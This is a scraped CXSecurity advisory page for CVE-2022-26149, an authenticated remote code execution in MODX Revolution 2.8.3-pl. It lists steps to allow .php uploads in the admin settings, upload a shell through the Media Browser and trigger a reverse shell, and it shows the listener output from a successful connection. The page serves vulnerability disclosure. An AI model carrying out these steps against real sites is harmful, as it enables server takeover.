---
title: MODX Revolution v2.8.3-pl Authenticated Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023030057
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-28
fetch_date: 2025-10-04T10:49:41.833563
---

# MODX Revolution v2.8.3-pl Authenticated Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **MODX Revolution v2.8.3-pl Authenticated Remote Code Execution** **2023.03.27**  Credit:  **[Sarang Tumne @CyberInsane (Twitter: @thecyberinsane)](https://cxsecurity.com/author/Sarang%2BTumne%2B%40CyberInsane%2B%28Twitter%3A%2B%40thecyberinsane%29/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-26149](https://cxsecurity.com/cveshow/CVE-2022-26149/ "Click to see CVE-2022-26149")**  CWE: **N/A** | |

# Exploit Title: MODX Revolution v2.8.3-pl - Authenticated Remote Code Execution
# Exploit Author: Sarang Tumne @CyberInsane (Twitter: @thecyberinsane)
# Date: 26th Feb'2022
# CVE ID: CVE-2022-26149
# Confirmed on release 2.8.3-pl
# Reference: https://github.com/sartlabs/0days/blob/main/Modx/Exploit.txt
# Vendor: https://modx.com/download
###############################################
#Step1- Login with Admin Credentials
#Step2- Uploading .php files is disabled by default hence we need to abuse the functionality:
Add the php file extension under the "Uploadable File Types" option available in "System Settings"
#Step3- Now Goto Media=>Media Browser and upload the Shell.php
#Step4- Now visit http://IP\_Address/Shell.php and get the reverse shell:
listening on [any] 4477 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.130] 58056
bash: cannot set terminal process group (1445): Inappropriate ioctl for device
bash: no job control in this shell
daemon@debian:/opt/bitnami/modx$

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030057)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top